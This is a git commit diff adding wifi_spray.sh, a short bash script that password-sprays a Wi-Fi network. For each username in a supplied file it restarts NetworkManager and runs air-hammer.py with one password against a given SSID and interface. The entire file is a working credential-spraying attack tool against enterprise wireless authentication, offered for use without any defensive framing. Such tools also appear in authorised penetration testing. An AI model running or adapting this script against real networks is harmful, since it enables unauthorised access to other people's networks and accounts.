3914883e685f6b9cd34532e7e2c5729392e426bb
samlazarus1 <97416513+samlazarus1@users.noreply.github.com>
2023-01-17 16:10:49 +1100

    Update wifi_spray.sh

--- wifi_spray.sh
+++ wifi_spray.sh
@@ -1,1 +1,23 @@
+#!/bin/bash
 
+if [ "$#" -ne 4 ]; then
+    echo "usage: sudo ./wifi_spray.sh username_file password wifi-interface SSID";
+    exit 1;
+fi
+
+usernames="$1"
+password="$2"
+interface="$3"
+ssid="$4"
+
+echo "username_file: $usernames"
+echo "password: $password" 
+echo "interface: $interface"
+echo "SSID: $ssid"
+
+for user in `cat $usernames`; do
+echo "trying $user";
+systemctl restart NetworkManager
+sleep 10
+sudo python3 air-hammer.py -i $interface -U $user -P $password -e $ssid;
+done
